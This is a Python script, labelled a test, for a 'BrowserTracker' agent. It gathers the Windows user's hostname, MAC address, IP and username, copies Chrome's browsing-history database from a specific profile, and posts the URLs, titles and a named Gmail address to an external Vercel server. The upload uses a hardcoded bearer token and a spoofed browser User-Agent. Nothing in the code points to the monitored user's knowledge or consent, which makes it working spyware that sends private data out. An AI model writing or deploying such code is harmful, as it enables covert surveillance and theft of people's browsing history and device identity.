"""
Test script for integrated agent
"""

import os
import sys
import json
import time
import requests
import sqlite3
import shutil
import tempfile
from datetime import datetime, timezone
import socket
import getpass
import platform
from uuid import getnode
import hashlib

class TestAgent:
    def __init__(self):
        # User data directory for storage
        self.user_data_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "BrowserTracker")
        os.makedirs(self.user_data_dir, exist_ok=True)
        
        # Configuration
        self.config = {
            "server_url": "https://browser-tracking.vercel.app",
            "api_token": "BrowserTracker2024SecureToken",
            "check_interval": 60,
            "batch_size": 50
        }
        
        # Data tracking
        self.sent_data_file = os.path.join(self.user_data_dir, 'sent_data.json')
        self.sent_data_hashes = self.load_sent_data()
        self.client_id = None
        
        print(f"✅ Test Agent initialized")
        print(f"📁 Data directory: {self.user_data_dir}")
        print(f"🌐 Server: {self.config['server_url']}")
    
    def load_sent_data(self):
        """Load previously sent data hashes"""
        try:
            if os.path.exists(self.sent_data_file):
                with open(self.sent_data_file, 'r') as f:
                    data = json.load(f)
                    return set(data.get('hashes', []))
            return set()
        except Exception as e:
            print(f"❌ Error loading sent data: {e}")
            return set()
    
    def create_data_hash(self, entry):
        """Create unique hash for data entry"""
        hash_string = f"{entry['url']}|{entry['title']}|{entry['visit_time']}|{entry['profile_name']}"
        return hashlib.md5(hash_string.encode()).hexdigest()
    
    def get_system_info(self):
        """Collect system information"""
        try:
            mac = getnode()
            mac_address = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
            
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            return {
                'hostname': socket.gethostname(),
                'mac_address': mac_address,
                'local_ip': local_ip,
                'username': getpass.getuser(),
                'os_info': {
                    'system': platform.system(),
                    'release': platform.release(),
                    'version': platform.version(),
                    'machine': platform.machine()
                }
            }
        except Exception as e:
            print(f"❌ Error getting system info: {e}")
            return None
    
    def send_data(self, endpoint, data):
        """Send data to server"""
        try:
            headers = {
                'Authorization': f'Bearer {self.config["api_token"]}',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            url = f'{self.config["server_url"]}/api/{endpoint}'
            print(f"📤 Sending to: {url}")
            
            response = requests.post(
                url,
                json=data,
                headers=headers,
                timeout=30
            )
            
            print(f"📊 Response status: {response.status_code}")
            if response.text:
                print(f"📄 Response: {response.text[:200]}...")
            
            return response.status_code == 200, response
            
        except Exception as e:
            print(f"❌ Error sending data to {endpoint}: {e}")
            return False, None
    
    def register_client(self):
        """Register client with server"""
        try:
            print("🔗 Registering client...")
            system_info = self.get_system_info()
            if not system_info:
                return False
            
            print(f"📋 System info: {system_info}")
            
            success, response = self.send_data('register', system_info)
            if success and response:
                data = response.json()
                if data.get('success'):
                    self.client_id = data.get('client_id')
                    print(f"✅ Client registered with ID: {self.client_id}")
                    return True
            
            print("❌ Failed to register client")
            return False
            
        except Exception as e:
            print(f"❌ Error registering client: {e}")
            return False
    
    def test_connection(self):
        """Test connection to server"""
        try:
            print("🔗 Testing server connection...")
            response = requests.get(f"{self.config['server_url']}/health", timeout=10)
            
            print(f"📊 Health check status: {response.status_code}")
            if response.status_code == 200:
                data = response.json()
                print(f"✅ Server online: {data.get('status', 'unknown')}")
                return True
            else:
                print(f"❌ Server returned status {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Connection failed: {e}")
            return False
    
    def get_chrome_history_sample(self):
        """Get sample Chrome history for testing"""
        try:
            chrome_base = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data')
            if not os.path.exists(chrome_base):
                print("⚠️ Chrome not found")
                return []
            
            print(f"📁 Chrome base: {chrome_base}")
            
            # Check Profile 8 (most active)
            profile_path = os.path.join(chrome_base, 'Profile 8')
            history_db = os.path.join(profile_path, 'History')
            
            if not os.path.exists(history_db):
                print("❌ Profile 8 History not found")
                return []
            
            print(f"📊 Reading from: {history_db}")
            
            # Copy database to avoid locking issues
            with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as temp_file:
                temp_db = temp_file.name
            
            shutil.copy2(history_db, temp_db)
            
            # Read history
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT url, title, visit_count, last_visit_time
                FROM urls
                WHERE last_visit_time > 0
                ORDER BY last_visit_time DESC
                LIMIT 5
            ''')
            
            entries = []
            for row in cursor.fetchall():
                url, title, visit_count, chrome_time = row
                
                # Convert Chrome timestamp
                if chrome_time > 0:
                    unix_timestamp = (chrome_time - 11644473600000000) / 1000000
                    visit_time = datetime.fromtimestamp(unix_timestamp, tz=timezone.utc)
                else:
                    visit_time = datetime.now(tz=timezone.utc)
                
                entry = {
                    'url': url[:2000],
                    'title': (title or '')[:500],
                    'visit_time': visit_time.isoformat(),
                    'browser_type': 'Chrome',
                    'profile_name': 'Profile 8',
                    'gmail_account': 'winduaji999@gmail.com'
                }
                
                entries.append(entry)
                print(f"📄 Entry: {title[:50]}... | {url[:50]}...")
            
            conn.close()
            os.unlink(temp_db)
            
            print(f"📊 Found {len(entries)} entries")
            return entries
            
        except Exception as e:
            print(f"❌ Error getting Chrome history: {e}")
            return []
    
    def test_full_flow(self):
        """Test complete flow"""
        print("\n" + "="*50)
        print("🧪 TESTING COMPLETE FLOW")
        print("="*50)
        
        # Test connection
        if not self.test_connection():
            print("❌ Connection test failed")
            return False
        
        # Register client
        if not self.register_client():
            print("❌ Registration failed")
            return False
        
        # Get sample data
        history = self.get_chrome_history_sample()
        if not history:
            print("❌ No history data")
            return False
        
        # Send data
        print(f"📤 Sending {len(history)} entries...")
        success, response = self.send_data('browsing-data', {
            'client_id': self.client_id,
            'browsing_data': history
        })
        
        if success:
            print("✅ Data sent successfully!")
            return True
        else:
            print("❌ Failed to send data")
            return False

if __name__ == "__main__":
    agent = TestAgent()
    agent.test_full_flow()
